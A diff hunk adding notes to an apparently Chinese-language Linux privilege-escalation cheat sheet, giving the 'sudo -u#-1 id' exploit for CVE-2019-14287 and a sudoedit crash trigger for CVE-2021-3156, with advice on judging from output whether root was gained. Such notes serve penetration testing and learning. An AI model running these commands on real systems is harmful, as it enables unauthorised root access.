@@ -152,6 +152,12 @@ sudo -l
 
 # 版本漏洞（不影响 sudoers 也能提权）
 sudo --version    # < 1.8.28 有 CVE-2019-14287（-u#-1 绕过）
+# 利用：sudo -u#-1 id   → 命中时回显 uid=0(root)
+#   验伤只有 `id` 输出算数：返回「Sorry, user ... is not allowed」= 版本没打中或已修补；
+#   返回 uid=0 才算成功。**sudo 版本低但 sudoers 不允许任意用户**时也打不通，别只看版本号。
+# CVE-2021-3156（Baron Samedit，sudoedit 堆溢出）：1.8.2~1.8.31p2 / 1.9.0~1.9.5p1
+#   验伤同上 —— `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` 崩了只说明有溢出触发点，
+#   真要拿到 root 还得有可用的 exploit；「崩了」不是提权成功。
 ```
 
 常见可利用模式：
